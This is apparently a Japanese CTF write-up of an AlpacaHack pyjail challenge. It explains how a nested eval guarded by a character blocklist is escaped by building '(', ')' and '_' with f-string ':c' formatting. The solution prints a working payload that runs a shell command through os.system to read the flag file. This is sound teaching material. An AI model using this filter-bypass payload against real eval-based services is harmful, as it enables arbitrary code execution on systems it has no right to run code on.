# [misc] nested eval

> 二重 eval。禁止文字は「入力文字列」だけに適用され、生成される文字列には効かない。f-string 書式で `(` `)` `_` を合成する。

## Overview

| Item | Value |
|------|-------|
| Platform | AlpacaHack |
| Event | Daily Challenge |
| Category | misc (pyjail) |
| Difficulty | Medium |
| Date | 2026-11-03 |
| Released | 2026-09-19 |
| Flag | `Alpaca{jail_tsukurun0_taihenda}` |

## Problem Statement

```python
code = input("jail> ")
assert code.isascii()
prohibited = ["(", ")", "\\", "+", "__"]
assert not any(p in code for p in prohibited)
eval(f"eval({code})")
```

flag は `/flag-<md5>.txt`（Dockerfile でリネーム）。

## TL;DR

- 外側 eval は文字列 `eval(<code>)` を評価する＝ **`<code>` をまず式として評価し、その
  結果（文字列）を内側 eval が実行**する。
- 禁止文字 `( ) \ + __` は**入力した `code` にしか効かない**。`code` が生成する文字列は
  何でもよい。
- `(` `)` `_` を打たずに作るには **f-string の書式変換 `{n:c}`** を使う:
  `{40:c}='('`, `{41:c}=')'`, `{95:c}='_'`。
- 内側で `__import__('os').system('cat /flag*')` を組み立てて実行。

## Background Knowledge

### f-string の `:c` 変換

`f"{40:c}"` は整数 40 を文字として整形し `'('` を返す（`format(40,'c')==chr(40)`）。
これで任意の ASCII 文字を、その文字自体を打たずに生成できる。括弧やアンダースコアが
禁止された jail で定番。

### フィルタの適用範囲

フィルタは「入力そのもの」を検査するだけで、入力が**動的に生成する文字列**は素通り。
二重評価(`eval(eval(...))`)では、1段目で安全な式→危険な文字列、2段目でそれを実行、
という分離で突破できる。

## Solution

```python
code = f"{95:c}{95:c}import{95:c}{95:c}{40:c}'os'{41:c}.system{40:c}'cat /flag*'{41:c}"
# -> 生成文字列: __import__('os').system('cat /flag*')
```

`code` 自体には `( ) \ + __` が一切含まれない。ローカル検証後リモートで実行。実装は `solve.py`。

## Lessons Learned

- 入力フィルタは「最終的に実行される文字列」ではなく「入力文字列」を見ているだけ、
  という**検査対象のズレ**を突く。多段評価は危険。
- `{n:c}` による文字合成は、括弧・アンダースコア禁止 jail の汎用回避策。

## Tags

`misc` `pyjail` `nested-eval` `fstring-format` `filter-bypass`
